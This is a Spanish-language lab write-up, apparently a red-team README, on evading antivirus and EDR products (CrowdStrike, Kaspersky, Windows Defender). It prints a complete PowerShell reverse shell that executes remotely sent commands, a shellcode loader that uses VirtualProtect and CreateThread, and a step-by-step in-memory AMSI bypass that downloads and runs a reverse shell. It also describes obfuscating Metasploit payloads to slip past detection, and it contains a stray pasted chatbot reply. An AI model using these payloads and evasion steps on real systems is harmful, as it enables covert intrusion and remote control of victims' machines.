# Evasion-de-AV-EDR

Este laboratorio tuvo como objetivo evaluar y documentar diferentes técnicas de evasión frente a soluciones de seguridad (AV/EDR/XDR), con énfasis en CrowdStrike y otros motores de referencia (Windows Defender, Kaspersky).

Durante las pruebas se implementaron distintos métodos de ejecución y ofuscación, destacando lo siguiente:

- **Ofuscación polimórfica** fue la técnica que mostró mejores resultados iniciales, permitiendo que payloads y scripts pasaran desapercibidos en varios entornos y sandboxes.
    
- Las **conexiones benignas** también demostraron ser eficaces, sobre todo cuando se cargan **directamente en memoria**, ya que aprovechan que muchos EDR priorizan la detección de cargas maliciosas y no de tráfico aparentemente legítimo. Sin embargo, la limitación es que en la mayoría de los casos el agente de seguridad bloquea la **ejecución posterior de comandos** sobre dicha conexión.
    
- La **detección de shellcode** sigue siendo un punto débil: la carga útil generada por herramientas conocidas es rápidamente identificada, lo que obliga a trabajar en mejoras en el empaquetado, cifrado y entrega de shellcode para aumentar la efectividad del bypass.
    
- La comparación de múltiples AV/EDR evidenció que no todos reaccionan de la misma forma. Algunos motores (ej. Panda, VirusTotal) no marcan los binarios como maliciosos, mientras que otros con heurísticas más estrictas (ej. Kaspersky) los detectan incluso cuando las cargas son benignas.

# Comparación rápida entre soluciones EDR

En el siguiente sitio podemos visualizar y comparar el nivel de cobertura que ofrecen distintas soluciones de seguridad en sistemas Windows:  
🔗 [EDR Telemetry](https://www.edr-telemetry.com/windows?utm_source=chatgpt.com)

En este caso, realizaremos una comparación entre **Cortex XDR** y **CrowdStrike Falcon**:

- **Cortex XDR** ofrece una cobertura integral que abarca endpoints, red y nube, con capacidades sólidas de correlación de eventos y análisis de comportamiento. Su motor de detección se apoya en **inteligencia artificial y aprendizaje automático**, lo que lo hace especialmente eficaz en entornos híbridos y distribuidos.

- **CrowdStrike Falcon**, por su parte, se destaca por su **ligereza, velocidad de despliegue y precisión en la detección de amenazas en endpoints**. Su arquitectura basada en la nube y su motor de comportamiento lo posicionan como una solución altamente avanzada, con una comunidad de usuarios más amplia y una interfaz más intuitiva. En escenarios de laboratorio, ha demostrado ser **más resistente a técnicas de evasión** que Cortex XDR en ciertos vectores.

Un punto interesante que se observa en la comparación es que **ninguna de las dos soluciones controla completamente el `Process Call Stack`**, lo que puede limitar la visibilidad profunda en ataques que manipulan el flujo de ejecución a nivel de sistema

![[Pasted image 20250828205134.png]]

Esto implica que no supervisan de forma exhaustiva todas las llamadas que se producen dentro de una función, lo cual representa una limitación común entre ambos productos.

Ejemplo de llamadas entre funciones:

```c++
#include <iostream>
using namespace std;

void despedirse() {
    cout << "Adiós" << endl;
}

void saludar() {
    cout << "Hola" << endl;
    despedirse();
}

int main() {
    cout << "Inicio del programa" << endl;
    saludar();
    cout << "Fin del programa" << endl;
    return 0;
}
```

Para evadir detecciones de EDR, es clave entender que estos monitorean llamadas críticas a funciones como `NtCreateFile` o `NtWriteVirtualMemory` en `ntdll.dll`, donde suelen aplicar hooks. Técnicas como **direct syscall invocation** permiten ejecutar instrucciones de bajo nivel directamente, evitando estos hooks y ocultando la función en el call stack. Aunque este método reduce la detección sin usar herramientas como Metasploit o Sliver, requiere más tiempo y esfuerzo que las soluciones automatizadas.

Podemos seguir explorando subcategorías no aplicadas. Se observa que **ninguno de los XDR monitorea URLs**, y **Cortex XDR no rastrea archivos descargados**, a diferencia de su contraparte. Esto se debe a que el análisis de URLs requiere integración con **proxies, firewalls o gateways de correo**, lo cual no siempre está habilitado.

¿Quieres que lo formatee para incluirlo en un informe técnico o presentación? También puedo ayudarte a traducirlo si lo necesitas en inglés.

![[Pasted image 20250828232413.png]]

Crowd Strike no analiza Registry Activity 

![[Pasted image 20250828233201.png]]

No analiza al Cien por ciento los servicios que se tiene activos 

![[Pasted image 20250828234230.png]]

En este punto sabemos que tipo de maneras podemos utilizar para intentar hacer un bypass, para lo cual voy a intentar utilizar diferentes tipos de ofuscacion en los AV/EDR que tengo disponibles 

# Conexiones Beningnas

En este primer escenario utilizamos un host victima window un host atacante con linux en este contexto ambas victimas se encuentran en la misma infraestructura,

Entonces como nos encontramos dentro de la misma infraestructura utilizamos conexiones benignas que pueden tornarse malignas, las conexiones benignas son aquellas conexiones son conexiones esperadas y que a simple vista no representan un peligro, se utiliza este metodo para evadir AV/EDR 

Para lo cual vamos a utilizar powershell para crear nuestro script de conexion 

```powershell
$LHOST = "10.X.X.X"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Ahora si ejecutamos directamente este script sin contexto alguno cualquier AV/ EDR bloqueara la conexión ya que los antivirus van a analizar estáticamente que ejecuta y que tipo de conexiones vienen de este archivo .ps1, para lo cual debemos encriptar o ofuscar el contenido que tenemos en este archivo 

Podemos realizar este tipo de ofuscación utilizando repositorios de github, en mi caso he elegido por utilizar `psobf`.

![[Pasted image 20250830090522.png]]

Utilizamos virus total y observamos que ningún AV/EDR detecta actividad maliciosa dentro del archivo ps1, por lo cual podríamos decir que esta todo okey que ya se ha pasado todos los AV/EDR

![[Pasted image 20250830090716.png]]

Ahora vamos a replicar este escenario en un entorno donde tengamos instalado Kaspersky, replicamos la misma metodología de ofuscación estática, dinámica y conexiones benignas, en este escenario si podemos ejecutar scripts desde la consola, observamos que a pesar que hayamos replicado los pasos no obtenemos conexión sino todo lo contrario `Kasperky` bloquea el intento de conexión.

![[Pasted image 20250830090841.png]]

Pues en este punto se puede pensar en ejecutar en memoria como lo hicimos con el script anterior no obstante lo vuelve a bloquear, esto sucede ya que la opcion dinamica que utiliza el ofuscador de archivo powershell shell llama a `Invoke-Expresion`
el cual muchos AV/EDR tienen ganchos

![[Pasted image 20250831120609.png]]

## Replicamos el escenario en Windows defender

La conexión benigna sigue siendo la misma, utilizamos la misma herramienta en para ofuscar el código y pasarlo a una maquina que tiene el Windows Defender a Tope 

![[Pasted image 20250830094502.png]]

Cabe aclarar que los AV/EDR no detectan al archivo como malicioso de primeras ya que muchas de estas soluciones no contemplan la descarga de archivos como maliciosa y otras que si 

![[Pasted image 20250830094625.png]]

Tenemos nuestra conexión final hecha y es hora de obtener una reverse shell 

Observamos que el Windows Defender no lo detecta 

![[Pasted image 20250830094848.png]]

# Borrando keys evadiendo AMSI

Primero verificamos que efectivamente no nos deje descargar herramientas como mimikatz, Rubeus o simplemente un script de conexión benigna 

![[Pasted image 20250831114734.png]]

Es fácilmente identificado 

![[Pasted image 20250830140838.png]]

Vamos a utilizar la herramienta [TrollDisappearKey](https://github.com/cybersectroll/TrollDisappearKey?utm_source=chatgpt.com)
, que permite **modificar o bloquear entradas específicas de AMSI** para evitar que Windows cargue ciertos proveedores de seguridad. Funciona creando **hooks en la función `RegOpenKeyEx`**, lo que permite filtrar, bloquear o modificar el acceso a las claves de registro asociadas con AMSI, evitando la detección de scripts maliciosos y permitiendo avanzar hacia objetivos como la persistencia de manera controlada. En nuestro laboratorio aprovechamos PowerShell para hacer **reflective loading en memoria**, descargando el código C# con `Invoke-WebRequest`, compilándolo con `Add-Type` y ejecutando `[TrollDisappearKeyPS]::DisappearKey()`, que hookea `RegOpenKeyEx` y desactiva AMSI en la sesión mediante `Uninitialize`. Todo esto ocurre **en memoria**, sin escribir archivos en disco, **minimizando la posibilidad de detección por AV/EDR** y permitiendo ejecutar scripts posteriores libremente.

Primero, descargamos el código fuente de `TrollDisappearKeyPS.cs` desde nuestro servidor y lo convertimos a UTF-8 para asegurar su correcta interpretación en PowerShell. Luego, con `Add-Type -TypeDefinition`, compilamos el código directamente en memoria, cargando la clase `[TrollDisappearKeyPS]` sin generar archivos en disco, manteniendo todo en **memory-only execution**. Finalmente, al ejecutar `[TrollDisappearKeyPS]::DisappearKey()`, se crea un hook en `RegOpenKeyExW` que intercepta intentos de abrir claves de registro de AMSI, bloqueando o modificando su información para que AMSI no pueda cargar sus proveedores de seguridad. 

![[Pasted image 20250830135935.png]]

Este paso es crucial porque AMSI es la defensa principal de Windows contra scripts maliciosos; al desactivarlo, cualquier código que ejecutemos después no será bloqueado por el antivirus en memoria.

![[Pasted image 20250830140241.png]]

Finalmente, descargamos y ejecutamos la reverse shell con `Invoke-Expression` directamente desde memoria usando `DownloadString`. El script establece una conexión TCP hacia nuestro C2, crea objetos `StreamReader` y `StreamWriter` para enviar y recibir datos, ejecuta los comandos que enviamos desde el C2 y devuelve la salida en tiempo real. Este enfoque **memory-only** asegura que la shell funcione sin dejar rastros en disco y permite pruebas de laboratorio efectivas y sigilosas, combinando AMSI bypass y control remoto completo.

![[Captura de pantalla 2025-08-30 134103.png]]

## Pruebas en Kasperky y Windows 11

Primero intentamos descargar Rubeus para ver si bloquea 


![[Pasted image 20250830144700.png]]

Y pues si lo cataloga como Trojano, entonces compilamos nuestro Troll

Para un equipo que corre windows 11 el repositorio cuanta con un archivo con la extension .cs para ser compilado utilizamos visual studio y se genera el archivo sin problema lo cual ya nos da un buen inicio que no lo detecta como malicioso 

![[Pasted image 20250830143913.png]]

No obstante utilizando las misma técnica observamos que claramente Kaspersky bloquea la llamada 

![[Pasted image 20250830145757.png]]

# Ofuscación Polimórfica

En la ofuscación polimórfica nos permite evadir AV/EDR consiste en modificar constantemente el código de un programa malicioso, generando variantes que mantienen la misma funcionalidad pero con una apariencia diferente en cada iteración. Aunque es común en ataques cibernéticos, también puede usarse en aplicaciones legítimas para proteger software contra ingeniería inversa.

Para lo cual vamos a utilizar herramientas como `AlphabeticalPolyShellGen` el cual es una herramienta escrita en C y Assembly por lo cual su detección es un poco mas complicada ya que son lenguajes de bajo nivel como se había explicado en el principio 

Esta herramienta básicamente nos permite reducir significativamente el peso de nuestro archivo binario 

![[Pasted image 20250830173607.png]]


Pero justamente solo tenemos un archivo binario casi que indectectable, como primera prueba hemos creado una archivo que solo ejecute una calculadora 

![[Pasted image 20250830173852.png]]

Utilizamos .\AlphabeticalPolyGen.exe para generar nuestro archivo binario ofuscado 

![[Pasted image 20250830174017.png]]

Verificamos que realmente este archivo no sea detectado estáticamente 

![[Pasted image 20250830174143.png]]

No es detectable ahora lo ejecutamos en un equipo que utilice Kasperky

![[Imagen de WhatsApp 2025-08-30 a las 16.39.13_2157d82a.jpg]]

Y pues si no es detectado, pero encontramos un pequeño gran problema que al ser un archivo binario depende de archivo que lo haga ejecutar para lo cual .\LocalShellcodeExec es detectable por varios antivirus en este caso no es detectable para panda, kasperky ni Windows Defender por lo cual es una mini victoria

Pero no tenemos que quedarnos ahi, asi que he estado desarrollando un script en powershell para ejecutar el binario sin la necesidad de utilizar .\LocalShellcodeExec el cual es detectable por varias soluciones

```powershell

# Leer el shellcode (ya ofuscado con PolyGen)
$sc = Get-Content ".\output_shellcode" -Encoding Byte

# Reservar memoria RWX
$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)

# Convertir permisos a ejecución
$VirtualProtect = @"
using System;
using System.Runtime.InteropServices;
public class VP {
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $VirtualProtect
[uint32]$old = 0
[VP]::VirtualProtect($addr, $sc.Length, 0x40, [ref]$old)

# Crear hilo
$ct = @"
using System;
using System.Runtime.InteropServices;
public class CT {
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $ct
$hThread = [CT]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[CT]::WaitForSingleObject($hThread, 0xFFFFFFFF)

```

Sin embargo este script sigue siendo limitado pues 10 soluciones lo encuentran como malicioso

![[Pasted image 20250830174919.png]]

Pero no lo detecta windows defender por lo cual vamos a intentar bypassear el defender 

![[Captura de pantalla 2025-08-30 164359.png]]

Se ejecuta correctamente, ahora debemos encontrar la manera de hacerlo mas facil de entregar e intentar utilizar memoria y no disco

Ahora vamos a probar el mismo script en Windows en un entorno que limita el script de powershell

![[Pasted image 20250830192810.png]]

Esto lo podemos intentar bypasear con powershell ise, lastimosamente no funciono 

![[Pasted image 20250830193059.png]]

No obstante cuando utilizamos `LocalShellcodeExec` para obtener una reverse shell funciona ya que `LocalShellcodeExec` es detectable solo en 10 AV/EDR ya que de por si no hace nada malicioso 

![[Captura de pantalla 2025-08-31 100813.png]]

Entonces generamos un binario que se conecte a cualquier C2 o Metasploit en mi caso, lo que vamos a realizar una reverse shell que tenga una conexion diferente y no meterpreter ya que este es detectado facilmente por los AV/edr

![[Captura de pantalla 2025-08-30 214713.png]]

Como sabemos este binario es fácilmente detectable y ahi es donde utilizamos AlphabeticalPolyGen, para ofuscar este binario y utilizar otro totalmente diferente 

Ejecutamos con el AV/EDR activo y tenemso conexion 

![[Captura de pantalla 2025-08-30 214844.png]]


En metasploit es necesario utilizar stages para que no se carge directamente el payload malicioso en el archivo binario si no que lo haga cuando encuentre conexion 

![[Captura de pantalla 2025-08-30 214648.png]]

Ahora observamos que efectivamente tenemos una reverse shell efectiva 

En este punto es importante generar persistencia ya que al ser un EDR este tiende a aprender por lo cual si se hace otra vez esta prueba no tendremos el mismo resultado

Otra técnica que estoy generando es ofuscar el `LocalShellcodeExec` ya que soluciones mucho mas sofisticadas, lo detectan facilmente 

![[Pasted image 20250831113548.png]]

# Conclusión

El método más prometedor hasta el momento ha sido la **ofuscación polimórfica**, aunque se requiere continuar refinando el manejo del shellcode para reducir la tasa de detección. Adicionalmente, el uso de **conexiones benignas en memoria** representa una alternativa válida para evadir monitoreo inicial, aunque su alcance práctico es limitado por las restricciones de ejecución que imponen los agentes de seguridad.

Estos resultados evidencian un entendimiento sólido de técnicas de evasión, limitaciones actuales y áreas de mejora, lo que constituye una base fuerte para el desarrollo de capacidades avanzadas en Red Team y adversary simulation.
